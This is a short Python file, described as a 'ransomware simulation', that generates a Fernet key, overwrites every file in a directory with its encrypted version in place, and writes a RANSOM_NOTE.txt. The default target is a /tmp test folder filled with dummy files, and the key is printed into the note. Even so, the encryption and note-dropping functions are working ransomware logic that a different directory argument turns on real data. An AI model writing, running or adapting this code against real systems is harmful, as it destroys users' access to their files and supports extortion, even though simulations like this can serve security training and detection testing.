import os
from cryptography.fernet import Fernet

def generate_key():
    """Generates a key for encryption."""
    return Fernet.generate_key()

def encrypt_file(key, filepath):
    """Encrypts a single file."""
    fernet = Fernet(key)
    with open(filepath, 'rb') as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(filepath, 'wb') as f:
        f.write(encrypted)

def encrypt_directory(key, directory):
    """Encrypts all files in a directory."""
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            encrypt_file(key, filepath)

def drop_ransom_note(directory, note_content="Your files have been encrypted."):
    """Drops a ransom note in the specified directory."""
    with open(os.path.join(directory, "RANSOM_NOTE.txt"), 'w') as f:
        f.write(note_content)

def run_ransomware_simulation(directory="/tmp/test_encryption"):
    """
    Runs a ransomware simulation on a specified directory.
    For safety, this is hardcoded to a non-critical directory.
    """
    if not os.path.exists(directory):
        os.makedirs(directory)
        # Create some dummy files for the simulation
        with open(os.path.join(directory, "file1.txt"), "w") as f:
            f.write("This is a test file.")
        with open(os.path.join(directory, "file2.txt"), "w") as f:
            f.write("This is another test file.")

    key = generate_key()
    encrypt_directory(key, directory)
    drop_ransom_note(directory, f"Your files are encrypted. To decrypt them, you need the key: {key.decode()}")
    return f"Ransomware simulation complete. Files in {directory} have been encrypted."
